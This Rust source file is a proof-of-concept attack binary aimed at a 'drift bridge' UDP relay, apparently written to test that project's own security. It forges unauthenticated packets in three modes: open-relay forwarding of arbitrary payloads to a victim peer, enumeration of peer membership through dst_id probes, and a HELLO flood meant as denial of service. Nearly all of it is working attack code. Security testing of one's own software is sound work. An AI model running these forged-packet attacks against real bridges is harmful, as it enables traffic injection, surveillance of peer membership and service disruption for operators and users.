//! Security testbed binary. Demonstrates three classes of
//! unauthenticated-input vulnerabilities in `drift bridge`:
//!
//!   relay     — open-relay (forwards arbitrary bytes to a
//!                bridge-known peer, no source check)
//!   enumerate — peer membership oracle via dst_id probe
//!   flood     — HELLO flood DoS (probes cookie-path threshold)
//!
//! All modes send raw UDP with crafted DRIFT headers. No
//! identity, no handshake, no peer registration.

use clap::{Parser, Subcommand};
use drift_core::derive_peer_id;
use drift_core::header::{Header, PacketType, HEADER_LEN};
use rand::RngCore;
use std::net::SocketAddr;
use tokio::net::UdpSocket;

#[derive(Parser, Debug)]
#[command(about = "Open-relay / enumeration / DoS PoC against drift bridge")]
struct Args {
    #[command(subcommand)]
    cmd: Mode,
}

#[derive(Subcommand, Debug)]
enum Mode {
    /// Open-relay: send Data packets with a chosen dst_id; bridge
    /// forwards if it has that peer.
    Relay {
        #[arg(long)]
        bridge: SocketAddr,
        #[arg(long, value_parser = parse_pubkey)]
        victim_pub: [u8; 32],
        #[arg(long, default_value_t = 1)]
        count: u32,
        #[arg(long, default_value = "ATTACK-PAYLOAD")]
        body: String,
        #[arg(long, default_value_t = 8)]
        hop_ttl: u8,
        /// Use PacketType::Federated instead of Data. Same forward
        /// path, different packet-type byte — confirms forwarding
        /// is type-agnostic.
        #[arg(long)]
        federated: bool,
    },
    /// Peer enumeration: send packets with N candidate dst_ids
    /// (1 real victim, N-1 random). Bridge will forward only the
    /// real one. With access to bridge logs/network observation,
    /// attacker learns membership.
    Enumerate {
        #[arg(long)]
        bridge: SocketAddr,
        #[arg(long, value_parser = parse_pubkey)]
        victim_pub: [u8; 32],
        /// Total probe count; 1 hit + (n-1) random misses.
        #[arg(long, default_value_t = 10)]
        n: u32,
    },
    /// HELLO flood: open many handshakes from random src_ids.
    /// Probes cookie-path threshold and session-table growth.
    Flood {
        #[arg(long)]
        bridge: SocketAddr,
        /// Bridge's static pubkey (needed for HELLO src_id field
        /// since real HELLO has src=initiator_static_pub; we use
        /// random instead but dst=bridge_id derived from this).
        #[arg(long, value_parser = parse_pubkey)]
        bridge_pub: [u8; 32],
        /// Number of fake handshakes to attempt.
        #[arg(long, default_value_t = 1000)]
        count: u32,
    },
}

fn parse_pubkey(s: &str) -> Result<[u8; 32], String> {
    let bytes = hex::decode(s).map_err(|e| format!("hex: {}", e))?;
    if bytes.len() != 32 {
        return Err(format!("need 32 bytes, got {}", bytes.len()));
    }
    let mut out = [0u8; 32];
    out.copy_from_slice(&bytes);
    Ok(out)
}

async fn send_forge(
    sock: &UdpSocket,
    bridge: SocketAddr,
    dst_id: [u8; 8],
    body: &[u8],
    hop_ttl: u8,
    pkt_type: PacketType,
) -> std::io::Result<usize> {
    let src_id = [0u8; 8];
    let mut header = Header::new(pkt_type, 0xDEAD_BEEF, src_id, dst_id);
    header = header.with_hop_ttl(hop_ttl);
    header.payload_len = body.len() as u16;
    let mut hbuf = [0u8; HEADER_LEN];
    header.encode(&mut hbuf);
    let mut packet = Vec::with_capacity(HEADER_LEN + body.len());
    packet.extend_from_slice(&hbuf);
    packet.extend_from_slice(body);
    sock.send_to(&packet, bridge).await
}

#[tokio::main]
async fn main() -> std::io::Result<()> {
    let args = Args::parse();
    let sock = UdpSocket::bind("0.0.0.0:0").await?;
    let local = sock.local_addr()?;
    eprintln!("[attacker] bound at {local}");
    let mut rng = rand::thread_rng();

    match args.cmd {
        Mode::Relay {
            bridge,
            victim_pub,
            count,
            body,
            hop_ttl,
            federated,
        } => {
            let victim_id = derive_peer_id(&victim_pub);
            let pkt_type = if federated {
                PacketType::Federated
            } else {
                PacketType::Data
            };
            println!(
                "RELAY: bridge={} victim_id={} type={:?} hop_ttl={} count={}",
                bridge,
                hex::encode(victim_id),
                pkt_type,
                hop_ttl,
                count
            );
            for i in 0..count {
                let n = send_forge(&sock, bridge, victim_id, body.as_bytes(), hop_ttl, pkt_type)
                    .await?;
                if i < 3 || i == count - 1 {
                    println!("  sent {} bytes (#{})", n, i + 1);
                }
            }
        }
        Mode::Enumerate {
            bridge,
            victim_pub,
            n,
        } => {
            let real_id = derive_peer_id(&victim_pub);
            println!(
                "ENUMERATE: bridge={} real_victim_id={} probes={}",
                bridge,
                hex::encode(real_id),
                n
            );
            // First send n-1 random dst_ids, then the real one
            // last so it's distinguishable in logs.
            let body = b"ENUM-PROBE";
            for i in 0..(n - 1) {
                let mut fake = [0u8; 8];
                rng.fill_bytes(&mut fake);
                send_forge(&sock, bridge, fake, body, 8, PacketType::Data).await?;
                if i < 3 {
                    println!("  probe #{}: random dst={}", i + 1, hex::encode(fake));
                }
            }
            send_forge(&sock, bridge, real_id, b"REAL-PROBE", 8, PacketType::Data).await?;
            println!(
                "  probe #{}: REAL dst={}",
                n,
                hex::encode(real_id)
            );
            println!("done. Count 'forwarded' lines in bridge log — expect exactly 1.");
        }
        Mode::Flood {
            bridge,
            bridge_pub,
            count,
        } => {
            let bridge_id = derive_peer_id(&bridge_pub);
            println!(
                "FLOOD: bridge={} bridge_id={} count={}",
                bridge,
                hex::encode(bridge_id),
                count
            );
            // Fake HELLO: PacketType::Hello, dst=bridge_id (so
            // the bridge processes locally instead of forwarding).
            // We send garbage as the body — the cookie-path
            // gatekeeper at handle_hello should reject it without
            // allocating session state. We're measuring whether
            // the bridge stays responsive under flood, and
            // whether memory grows.
            let body = vec![0xAAu8; 200]; // bogus pubkey + nonce material
            for i in 0..count {
                let mut fake_src = [0u8; 8];
                rng.fill_bytes(&mut fake_src);
                let mut header = Header::new(PacketType::Hello, 0, fake_src, bridge_id);
                header.payload_len = body.len() as u16;
                let mut hbuf = [0u8; HEADER_LEN];
                header.encode(&mut hbuf);
                let mut packet = Vec::with_capacity(HEADER_LEN + body.len());
                packet.extend_from_slice(&hbuf);
                packet.extend_from_slice(&body);
                let _ = sock.send_to(&packet, bridge).await;
                if i % 100 == 0 {
                    eprint!(".");
                }
            }
            eprintln!();
            println!("done — {} bogus HELLOs sent.", count);
        }
    }
    Ok(())
}
